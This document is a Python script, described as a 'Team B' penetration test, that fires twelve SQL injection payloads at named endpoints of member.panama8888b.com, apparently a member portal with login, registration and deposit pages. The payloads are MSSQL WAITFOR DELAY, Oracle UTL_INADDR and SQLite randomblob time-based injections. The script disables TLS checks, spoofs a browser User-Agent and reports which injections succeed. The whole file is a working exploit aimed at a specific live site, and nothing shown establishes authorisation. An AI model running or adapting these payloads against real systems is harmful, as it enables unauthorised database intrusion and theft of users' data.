#!/usr/bin/env python3

"""
Test README Vulnerabilities Script
Test the specific SQL injection vulnerabilities found in README
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re
from datetime import datetime

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class READMEVulnerabilityTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.test_results = {}
        
    def test_sql_injection(self, url, method, parameter, payload, description):
        """Test specific SQL injection vulnerability"""
        print(f"[*] Testing: {description}")
        print(f"[*] URL: {url}")
        print(f"[*] Method: {method}")
        print(f"[*] Parameter: {parameter}")
        print(f"[*] Payload: {payload}")
        
        try:
            if method.upper() == "GET":
                # Test GET request
                params = {parameter: payload}
                response = self.session.get(url, params=params, timeout=15)
            else:
                # Test POST request
                data = {parameter: payload}
                response = self.session.post(url, json=data, timeout=15)
            
            # Analyze response
            info = {
                'url': url,
                'method': method,
                'parameter': parameter,
                'payload': payload,
                'status_code': response.status_code,
                'content_length': len(response.text),
                'response_time': response.elapsed.total_seconds(),
                'timestamp': datetime.now().isoformat(),
                'vulnerability_detected': False,
                'evidence': {},
                'sql_errors': [],
                'database_info': {}
            }
            
            content = response.text
            content_lower = content.lower()
            
            # Check for SQL errors
            sql_error_patterns = [
                r'microsoft sql server',
                r'sql server',
                r'incorrect syntax',
                r'unclosed quotation mark',
                r'conversion failed',
                r'division by zero',
                r'arithmetic overflow',
                r'string or binary data would be truncated',
                r'cannot insert duplicate key',
                r'foreign key constraint',
                r'primary key constraint',
                r'oracle',
                r'sqlite',
                r'mysql'
            ]
            
            for pattern in sql_error_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    info['sql_errors'].extend(matches)
                    info['vulnerability_detected'] = True
                    print(f"[+] SQL ERROR FOUND: {matches}")
            
            # Check for specific database indicators
            if 'microsoft sql server' in content_lower:
                info['database_info']['type'] = 'MSSQL'
                info['vulnerability_detected'] = True
                print("[+] MSSQL Database Detected")
            
            if 'oracle' in content_lower:
                info['database_info']['type'] = 'Oracle'
                info['vulnerability_detected'] = True
                print("[+] Oracle Database Detected")
            
            if 'sqlite' in content_lower:
                info['database_info']['type'] = 'SQLite'
                info['vulnerability_detected'] = True
                print("[+] SQLite Database Detected")
            
            # Check for time-based injection evidence
            if response.elapsed.total_seconds() > 5:
                info['evidence']['time_based'] = True
                info['vulnerability_detected'] = True
                print(f"[+] TIME-BASED INJECTION: {response.elapsed.total_seconds()}s")
            
            # Check for error-based injection evidence
            if response.status_code == 500:
                info['evidence']['error_based'] = True
                info['vulnerability_detected'] = True
                print("[+] ERROR-BASED INJECTION: HTTP 500")
            
            # Check for boolean-based injection evidence
            if len(content) < 1000 and ('true' in content_lower or 'false' in content_lower):
                info['evidence']['boolean_based'] = True
                info['vulnerability_detected'] = True
                print("[+] BOOLEAN-BASED INJECTION: Short response with true/false")
            
            # Check for union-based injection evidence
            if 'union' in payload.lower() and len(content) > 10000:
                info['evidence']['union_based'] = True
                info['vulnerability_detected'] = True
                print("[+] UNION-BASED INJECTION: Large response")
            
            if info['vulnerability_detected']:
                print(f"[+] VULNERABILITY CONFIRMED: {description}")
            else:
                print(f"[!] No vulnerability detected for: {description}")
            
            return info
            
        except Exception as e:
            print(f"[!] Error testing {description}: {e}")
            return {
                'url': url,
                'method': method,
                'parameter': parameter,
                'payload': payload,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def run_readme_tests(self):
        """Run tests based on README vulnerabilities"""
        print("="*70)
        print("TESTING README VULNERABILITIES")
        print("="*70)
        
        # Test cases from README
        test_cases = [
            {
                'url': 'https://member.panama8888b.com/api/deposit/qr',
                'method': 'POST',
                'parameter': 'amount',
                'payload': "3000'",
                'description': 'SQL Injection - Basic (POST)'
            },
            {
                'url': 'https://member.panama8888b.com/public/js/v2/app.js',
                'method': 'GET',
                'parameter': 'v',
                'payload': "25.1)) WAITFOR DELAY '0:0:15' --",
                'description': 'SQL Injection - MSSQL Time-based'
            },
            {
                'url': 'https://member.panama8888b.com/public/js/v2/app.js',
                'method': 'GET',
                'parameter': 'v',
                'payload': "25.1 / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual)",
                'description': 'SQL Injection - Oracle Time-based'
            },
            {
                'url': 'https://member.panama8888b.com/user/dashboard',
                'method': 'GET',
                'parameter': 'line_id',
                'payload': "@vippnm888' / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) / '",
                'description': 'SQL Injection - Oracle Time-based (Dashboard)'
            },
            {
                'url': 'https://member.panama8888b.com/api/announcement',
                'method': 'POST',
                'parameter': 'image',
                'payload': "announcement/3yHY2OAtmvTpuQQmBZ2UmkqjAZH8id1bcDKeo6Ab.png and exists (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.5') from dual) --",
                'description': 'SQL Injection - Oracle Time-based (Announcement)'
            },
            {
                'url': 'https://member.panama8888b.com/auth/login',
                'method': 'POST',
                'parameter': 'password',
                'payload': "case randomblob(10000000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (Login)'
            },
            {
                'url': 'https://member.panama8888b.com/public/js/v2/app.js',
                'method': 'GET',
                'parameter': 'v',
                'payload': "case randomblob(100000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (App.js)'
            },
            {
                'url': 'https://member.panama8888b.com/user/dashboard',
                'method': 'GET',
                'parameter': 'line_id',
                'payload': "case randomblob(1000000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (Dashboard)'
            },
            {
                'url': 'https://member.panama8888b.com/api/announcement',
                'method': 'POST',
                'parameter': 'status',
                'payload': "case randomblob(1000000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (Status)'
            },
            {
                'url': 'https://member.panama8888b.com/api/deposit/qr',
                'method': 'POST',
                'parameter': 'amount',
                'payload': "case randomblob(100000000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (Deposit)'
            },
            {
                'url': 'https://member.panama8888b.com/auth/login',
                'method': 'POST',
                'parameter': '_token',
                'payload': "case randomblob(10000000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (Token)'
            },
            {
                'url': 'https://member.panama8888b.com/register',
                'method': 'POST',
                'parameter': 'password_confirmation',
                'payload': "case randomblob(100000000) when not null then 1 else 1 end",
                'description': 'SQL Injection - SQLite Time-based (Register)'
            }
        ]
        
        print(f"\n[*] Running {len(test_cases)} vulnerability tests from README...")
        
        for i, test_case in enumerate(test_cases, 1):
            print(f"\n[{i}/{len(test_cases)}] Testing vulnerability...")
            
            result = self.test_sql_injection(
                test_case['url'],
                test_case['method'],
                test_case['parameter'],
                test_case['payload'],
                test_case['description']
            )
            
            self.test_results[test_case['description']] = result
            
            # Delay between tests
            time.sleep(2)
        
        # Summary
        print("\n" + "="*70)
        print("VULNERABILITY TEST SUMMARY")
        print("="*70)
        
        vulnerable_count = 0
        total_tests = len(self.test_results)
        
        for description, result in self.test_results.items():
            if result.get('vulnerability_detected'):
                vulnerable_count += 1
                print(f"\n[+] VULNERABLE: {description}")
                if result.get('database_info'):
                    print(f"  Database: {result['database_info']}")
                if result.get('evidence'):
                    print(f"  Evidence: {result['evidence']}")
                if result.get('sql_errors'):
                    print(f"  SQL Errors: {result['sql_errors']}")
            else:
                print(f"\n[-] NOT VULNERABLE: {description}")
        
        print(f"\n[+] SUMMARY: {vulnerable_count}/{total_tests} vulnerabilities confirmed")
        
        if vulnerable_count > 0:
            print("\n[+] CRITICAL: SQL Injection vulnerabilities confirmed!")
            print("[+] These match the findings in README")
        else:
            print("\n[!] No vulnerabilities confirmed")
            print("[!] Target may have been patched")
        
        return self.test_results
    
    def save_test_results(self, filename="readme_vulnerability_results.json"):
        """Save test results"""
        with open(filename, 'w') as f:
            json.dump(self.test_results, f, indent=2)
        print(f"\n[+] Test results saved to: {filename}")

def main():
    try:
        tester = READMEVulnerabilityTester()
        results = tester.run_readme_tests()
        tester.save_test_results()
        
        if results:
            print("\n[+] README vulnerability testing completed!")
            print("[+] Check the JSON file for detailed results")
        else:
            print("\n[!] No test results obtained")
        
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()